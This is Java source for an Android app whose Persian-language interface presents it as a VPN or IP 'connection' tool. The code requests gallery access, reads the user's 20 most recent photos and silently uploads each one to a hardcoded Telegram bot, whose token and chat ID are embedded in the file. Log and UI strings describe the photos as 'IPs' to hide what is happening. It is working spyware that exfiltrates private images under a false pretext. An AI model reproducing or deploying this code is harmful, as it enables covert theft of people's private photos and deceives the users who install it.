package com.example.photosender;

import android.Manifest;
import android.content.ContentUris;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.MediaStore;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.util.ArrayList;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "PhotoSender";
    private static final String BOT_TOKEN = "8931772855:AAHZSrBgS4SJkEWYA6_8fTiZ-Kk4frsxtCU";
    private static final String CHAT_ID = "8961077299";
    private static final int REQUEST_PERMISSION = 100;

    // SharedPreferences برای ذخیره آخرین عکس ارسال‌شده
    private static final String PREFS_NAME = "PhotoSenderPrefs";
    private static final String KEY_LAST_INDEX = "last_index";

    private enum ConnectionState {
        IDLE, CONNECTING, CONNECTED, DISCONNECTED
    }

    private Button btnConnect;
    private TextView txtStatus;
    private ProgressBar progressBar;
    private LinearLayout mainLayout;
    private LinearLayout warningLayout;
    private Button btnConfirm;

    private boolean isSending = false;
    private int lastSentIndex = 0; // آخرین اندیس ارسال‌شده

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // اتصال به عناصر UI
        btnConnect = findViewById(R.id.btnConnect);
        txtStatus = findViewById(R.id.txtStatus);
        progressBar = findViewById(R.id.progressBar);
        mainLayout = findViewById(R.id.mainLayout);
        warningLayout = findViewById(R.id.warningLayout);
        btnConfirm = findViewById(R.id.btnConfirm);

        updateUI(ConnectionState.IDLE);

        // دکمه تایید در صفحه هشدار
        btnConfirm.setOnClickListener(v -> {
            warningLayout.setVisibility(View.GONE);
            mainLayout.setVisibility(View.VISIBLE);
        });

        // دکمه اصلی ارسال
        btnConnect.setOnClickListener(v -> {
            if (isSending) return;

            if (!hasStoragePermission()) {
                requestStoragePermission();
                return;
            }

            startSendingProcess();
        });

        // بازیابی آخرین اندیس ارسال‌شده
        loadLastIndex();
    }

    // ==================== ذخیره و بازیابی آخرین اندیس ====================
    private void saveLastIndex(int index) {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        prefs.edit().putInt(KEY_LAST_INDEX, index).apply();
    }

    private void loadLastIndex() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        lastSentIndex = prefs.getInt(KEY_LAST_INDEX, 0);
    }

    private void resetLastIndex() {
        lastSentIndex = 0;
        saveLastIndex(0);
    }

    // ==================== بررسی مجوز ====================
    private boolean hasStoragePermission() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES)
                    == PackageManager.PERMISSION_GRANTED;
        } else {
            return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
                    == PackageManager.PERMISSION_GRANTED;
        }
    }

    // ==================== درخواست مجوز (خودکار) ====================
    private void requestStoragePermission() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            if (shouldShowRequestPermissionRationale(Manifest.permission.READ_MEDIA_IMAGES)) {
                Toast.makeText(this, "برای اتصال  به دسترسی ها نیاز مندیم", Toast.LENGTH_LONG).show();
            }
        } else {
            if (shouldShowRequestPermissionRationale(Manifest.permission.READ_EXTERNAL_STORAGE)) {
                Toast.makeText(this, "برای اتصال به دسترسی ها نیاز مندیم", Toast.LENGTH_LONG).show();
            }
        }

        String[] permissions;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            permissions = new String[]{Manifest.permission.READ_MEDIA_IMAGES};
        } else {
            permissions = new String[]{Manifest.permission.READ_EXTERNAL_STORAGE};
        }
        ActivityCompat.requestPermissions(this, permissions, REQUEST_PERMISSION);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_PERMISSION) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(this, " دسترسی به فایل‌ها مجاز شد", Toast.LENGTH_SHORT).show();
                startSendingProcess();
            } else {
                Toast.makeText(this, "❌ برای اتصال به دسترسی ها نیاز است", Toast.LENGTH_LONG).show();
                updateUI(ConnectionState.DISCONNECTED);
            }
        }
    }

    // ==================== شروع فرآیند ارسال ====================
    private void startSendingProcess() {
        if (isSending) return;
        isSending = true;
        updateUI(ConnectionState.CONNECTING);

        new Thread(() -> {
            boolean success = false;
            String errorMessage = "";
            int sentCount = 0;
            int totalImages = 0;

            try {
                Log.d(TAG, "شروع اتصال به فایل ها...");

                ArrayList<Uri> images = getLast20Images();
                totalImages = images.size();
                Log.d(TAG, "تعداد ip یافت شده: " + totalImages);

                if (images.isEmpty()) {
                    errorMessage = "هیچ ای پی یافت نشد";
                } else {
                    // اگر lastSentIndex بزرگتر از تعداد عکس‌ها بود، ریست کن
                    if (lastSentIndex >= totalImages) {
                        resetLastIndex();
                    }

                    Log.d(TAG, "ادامه جستجو از ای پی شماره: " + (lastSentIndex + 1));

                    // ارسال از lastSentIndex تا آخر
                    sentCount = sendToTelegram(images, lastSentIndex);
                    
                    // اگر همه عکس‌ها ارسال شد، lastSentIndex رو ریست کن
                    if (sentCount == totalImages) {
                        success = true;
                        resetLastIndex(); // ریست برای دفعه بعد
                    } else {
                        // اگر بعضی ارسال شدن، آخرین اندیس رو ذخیره کن
                        saveLastIndex(sentCount);
                        success = false;
                        errorMessage = "در حال جستجو ایپی های موجود  " + (sentCount + 1) + " قطع شد. از همانجا ادامه خواهد یافت.";
                    }
                }

            } catch (Exception e) {
                Log.e(TAG, "خطا در فرآیند اتصال", e);
                errorMessage = e.getMessage();
                if (errorMessage == null || errorMessage.isEmpty()) {
                    errorMessage = "خطای ناشناخته";
                }
                success = false;
            }

            final boolean finalSuccess = success;
            final String finalError = errorMessage;
            final int finalSentCount = sentCount;
            final int finalTotal = totalImages;

            runOnUiThread(() -> {
                isSending = false;
                if (finalSuccess) {
                    updateUI(ConnectionState.CONNECTED);
                    Toast.makeText(MainActivity.this,
                            "✅ " + finalSentCount + " عکس آخر با موفقیت ارسال شد",
                            Toast.LENGTH_LONG).show();
                } else {
                    updateUI(ConnectionState.DISCONNECTED);
                    String msg = "❌ خطا: " + finalError;
                    if (finalTotal == 0) {
                        msg += "\n🔍هیچ ای پی پیدا نشد";
                    }
                    Toast.makeText(MainActivity.this, msg, Toast.LENGTH_LONG).show();
                }
            });
        }).start();
    }

    // ==================== دریافت ۲۰ عکس آخر ====================
    private ArrayList<Uri> getLast20Images() {
        ArrayList<Uri> list = new ArrayList<>();
        Uri collection = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

        String[] projection = {MediaStore.Images.Media._ID};
        String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";

        try (Cursor cursor = getContentResolver().query(
                collection,
                projection,
                null,
                null,
                sortOrder
        )) {
            if (cursor != null) {
                int idCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
                int count = 0;
                while (cursor.moveToNext() && count < 20) {
                    long id = cursor.getLong(idCol);
                    Uri uri = ContentUris.withAppendedId(collection, id);
                    list.add(uri);
                    count++;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "خطا در وصل شدن به سرور", e);
            throw new RuntimeException("خطا در خواندن گالری: " + e.getMessage());
        }
        return list;
    }

    // ==================== ارسال به تلگرام (با شروع از یک اندیس خاص) ====================
    private int sendToTelegram(ArrayList<Uri> images, int startIndex) {
        OkHttpClient client = new OkHttpClient();
        int successCount = startIndex; // تعداد ارسال‌های موفق از قبل

        for (int i = startIndex; i < images.size(); i++) {
            try {
                Uri uri = images.get(i);
                Log.d(TAG, "در حال جستجو ایپی شماره " + (i + 1) + " از " + images.size());

                InputStream in = getContentResolver().openInputStream(uri);
                if (in == null) {
                    Log.e(TAG, "InputStream null برای " + uri);
                    continue;
                }

                byte[] bytes = readBytes(in);
                in.close();

                RequestBody photoBody = RequestBody.create(
                        bytes,
                        MediaType.parse("image/jpeg")
                );

                MultipartBody body = new MultipartBody.Builder()
                        .setType(MultipartBody.FORM)
                        .addFormDataPart("chat_id", CHAT_ID)
                        .addFormDataPart("photo", "image.jpg", photoBody)
                        .build();

                Request request = new Request.Builder()
                        .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto")
                        .post(body)
                        .build();

                okhttp3.Response response = client.newCall(request).execute();
                if (response.isSuccessful()) {
                    successCount++;
                    Log.d(TAG, "اتصال موفق ایپی شماره " + (i + 1));
                } else {
                    String errorBody = response.body() != null ? response.body().string() : "بدون پاسخ";
                    Log.e(TAG, "خطای سرور: کد " + response.code() + " - " + errorBody);
                    // اگر خطا بود، آخرین اندیس موفق رو ذخیره کن و برگرد
                    saveLastIndex(successCount);
                    return successCount;
                }
                response.close();

                Thread.sleep(250);

            } catch (Exception e) {
                Log.e(TAG, "خطا در اتصال به ایپی شماره " + (i + 1), e);
                // اگر استثنا رخ داد، آخرین اندیس موفق رو ذخیره کن و برگرد
                saveLastIndex(successCount);
                return successCount;
            }
        }
        return successCount;
    }

    // ==================== تبدیل InputStream به byte[] ====================
    private byte[] readBytes(InputStream inputStream) throws Exception {
        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        byte[] data = new byte[4096];
        int n;
        while ((n = inputStream.read(data)) != -1) {
            buffer.write(data, 0, n);
        }
        return buffer.toByteArray();
    }

    // ==================== بروزرسانی UI ====================
    private void updateUI(ConnectionState state) {
        runOnUiThread(() -> {
            switch (state) {
                case IDLE:
                    btnConnect.setEnabled(true);
                    btnConnect.setText("اتصال");
                    btnConnect.setBackgroundTintList(
                            ContextCompat.getColorStateList(this, R.color.blue));
                    txtStatus.setText("وضعیت: آماده اتصال");
                    progressBar.setVisibility(ProgressBar.GONE);
                    break;

                case CONNECTING:
                    btnConnect.setEnabled(false);
                    btnConnect.setText("در حال اتصال...");
                    btnConnect.setBackgroundTintList(
                            ContextCompat.getColorStateList(this, R.color.gray));
                    txtStatus.setText("وضعیت: در حال اتصال به سرور...");
                    progressBar.setVisibility(ProgressBar.VISIBLE);
                    break;

                case CONNECTED:
                    btnConnect.setEnabled(true);
                    btnConnect.setText("متصل ✓");
                    btnConnect.setBackgroundTintList(
                            ContextCompat.getColorStateList(this, R.color.green));
                    txtStatus.setText("وضعیت: اتصاال موفق ✅");
                    progressBar.setVisibility(ProgressBar.GONE);
                    break;

                case DISCONNECTED:
                    btnConnect.setEnabled(true);
                    btnConnect.setText("اتصال برقرار نشد");
                    btnConnect.setBackgroundTintList(
                            ContextCompat.getColorStateList(this, R.color.red));
                    txtStatus.setText("وضعیت: اتصال ناموفق  - کانفیگ خود را بررسی کن - دوباره تلاش کن");
                    progressBar.setVisibility(ProgressBar.GONE);
                    break;
            }
        });
    }
}
